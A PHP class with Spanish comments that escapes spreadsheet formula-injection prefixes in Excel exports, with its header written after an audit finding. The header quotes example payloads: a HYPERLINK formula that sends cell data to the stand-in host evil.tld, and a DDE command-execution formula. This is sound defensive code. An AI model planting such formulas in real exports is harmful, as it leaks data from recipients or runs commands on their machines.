<?php

namespace App\Support;

/**
 * ExcelSanitizer — neutraliza CSV/XLSX Formula Injection.
 *
 * PROBLEMA (post-auditoría 2026-05-06, HIGH #1):
 *   Excel/LibreOffice/Numbers interpretan valores que comienzan con
 *   `=`, `+`, `-`, `@`, tab o CR como FÓRMULAS al abrir el archivo —
 *   incluso sobre archivos .xlsx generados por una app web.
 *
 *   Un atacante con sesión que pueda escribir en un campo de texto
 *   (tipo_actividad, descripcion_actividad, lugar, nombre_apellido, etc.) puede inyectar:
 *
 *     =HYPERLINK("https://evil.tld/?d="&A1, "Click")
 *     =cmd|'/C calc'!A0       (DDE legacy)
 *     +SUM(A1:A10)            (lectura de celdas vecinas)
 *
 *   Cuando el Excel exportado se comparta con OTRA dependencia
 *   gubernamental (escenario común en VE), el receptor abre el archivo
 *   y la fórmula se ejecuta en SU contexto.
 *
 * MITIGACIÓN:
 *   Si el valor empieza con uno de los caracteres peligrosos, lo prefijamos
 *   con apóstrofo `'`. Excel reconoce ese prefijo como "tratar como texto literal"
 *   y NO ejecuta la fórmula. El apóstrofo NO se muestra en la celda — Excel lo
 *   oculta visualmente, así que el usuario final ve el texto correcto.
 *
 * USO:
 *
 *   use App\Support\ExcelSanitizer as E;
 *   // ...
 *   return $reportes->map(fn ($r) => [
 *       E::clean($r->tipo_actividad),
 *       E::clean($r->lugar),
 *       // ...
 *   ]);
 *
 * Referencias:
 *   - OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
 *   - CWE-1236: https://cwe.mitre.org/data/definitions/1236.html
 */
class ExcelSanitizer
{
    /**
     * Caracteres que Excel/LibreOffice interpretan como inicio de fórmula.
     *  - `=`, `+`, `-`, `@` son operadores de fórmula directos
     *  - `\t` (tab) y `\r` (carriage return) pueden inyectar separadores en CSV
     */
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Sanitiza un valor escalar antes de escribirlo a una celda Excel.
     *
     * - Si es null o string vacío, lo devuelve tal cual.
     * - Si es número, fecha o bool, NO los toca (no son strings con prefix peligroso).
     * - Si es string que empieza con prefix peligroso, lo prefija con `'`.
     */
    public static function clean(mixed $value): mixed
    {
        if ($value === null || $value === '') {
            return $value;
        }

        // Solo procesamos strings; números/fechas/bool van directo
        if (!is_string($value)) {
            return $value;
        }

        $first = mb_substr($value, 0, 1);
        if (in_array($first, self::DANGEROUS_PREFIXES, true)) {
            return "'" . $value;
        }

        return $value;
    }

    /**
     * Sanitiza una fila completa (array asociativo o indexado) — útil cuando
     * tienes un array y quieres mapear todos sus valores en una sola pasada.
     */
    public static function cleanRow(array $row): array
    {
        return array_map(fn ($v) => self::clean($v), $row);
    }
}
